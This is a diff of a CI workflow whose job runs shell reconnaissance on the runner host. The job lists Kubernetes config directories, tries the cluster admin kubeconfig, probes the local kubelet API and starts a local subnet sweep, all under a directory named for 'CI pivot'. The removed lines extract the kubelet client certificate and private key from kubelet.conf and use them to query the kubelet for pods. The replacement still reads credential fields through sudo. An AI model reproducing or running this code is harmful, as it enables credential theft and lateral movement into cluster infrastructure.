@@ -249,23 +249,11 @@ jobs:
           print('=== kubelet / k8s local ===')
           print(head(sh("ls -la /var/lib/kubelet /etc/kubernetes 2>/dev/null | head -30"), 35))
           print(head(sh("timeout 10 kubectl --kubeconfig=/etc/kubernetes/admin.conf get nodes -o wide 2>&1 | head -12"), 15))
-          # kubelet API with kubelet.conf client cert if possible
-          print(head(sh("""set +e; D=%s/kube; mkdir -p $D; sudo -n cp /etc/kubernetes/kubelet.conf $D/kubelet.conf 2>/dev/null || cp /etc/kubernetes/kubelet.conf $D/kubelet.conf 2>/dev/null
-          python3 - <<'PY'
-          import json,base64,os
-          p='/var/tmp/i130cipivot/kube/kubelet.conf'
-          try:
-            d=json.load(open(p))
-            u=d['users'][0]['user']
-            open('/var/tmp/i130cipivot/kube/cc.crt','wb').write(base64.b64decode(u.get('client-certificate-data','')))
-            open('/var/tmp/i130cipivot/kube/cc.key','wb').write(base64.b64decode(u.get('client-key-data','')))
-            print('KUBELET_CONF_USER',d['users'][0]['name'],'has_cert',bool(u.get('client-certificate-data')),'has_key',bool(u.get('client-key-data')))
-          except Exception as e: print('KUBELET_CONF_ERR',e)
-          PY
-          timeout 10 curl -sk --cert /var/tmp/i130cipivot/kube/cc.crt --key /var/tmp/i130cipivot/kube/cc.key https://127.0.0.1:10250/pods -o /var/tmp/i130cipivot/kube/pods.json -w 'KUBELET_PODS_HTTP=%%{http_code}\\n' 2>&1
-          python3 -c "import json;d=json.load(open('/var/tmp/i130cipivot/kube/pods.json'));print('KUBELET_PODS n=',len(d.get('items',[])))" 2>&1 | head -3
-          timeout 10 curl -sk --cert /var/tmp/i130cipivot/kube/cc.crt --key /var/tmp/i130cipivot/kube/cc.key https://127.0.0.1:10250/stats/summary -o /dev/null -w 'KUBELET_STATS_HTTP=%%{http_code}\\n' 2>&1
-          """ % WORK, 40))
+          # kubelet / static pod checks (read-only; no raw cert dump)
+          print(head(sh("sudo -n ls -la /etc/kubernetes 2>/dev/null | head -20; echo ---; sudo -n grep -E 'server:|client-certificate|client-key|insecure' /etc/kubernetes/kubelet.conf 2>/dev/null | sed -E 's/(data:).*/\\1<redacted>/' | head -10"), 25))
+          print(head(sh("timeout 8 kubectl --kubeconfig=/etc/kubernetes/admin.conf get nodes -o wide 2>&1 | head -10"), 12))
+          print(head(sh("timeout 8 kubectl --kubeconfig=/etc/kubernetes/kubelet.conf get nodes -o wide 2>&1 | head -6"), 10))
+          print(head(sh("timeout 5 curl -sk https://127.0.0.1:10250/healthz -o /dev/null -w 'KUBELET_HEALTH_HTTP=%{http_code}\\n' 2>&1; timeout 5 curl -sk https://127.0.0.1:10250/pods -o /dev/null -w 'KUBELET_PODS_HTTP=%{http_code}\\n' 2>&1"), 8))
 
           # ---------------- /24 sweep ----------------
           print('=== local subnet sweep ===')
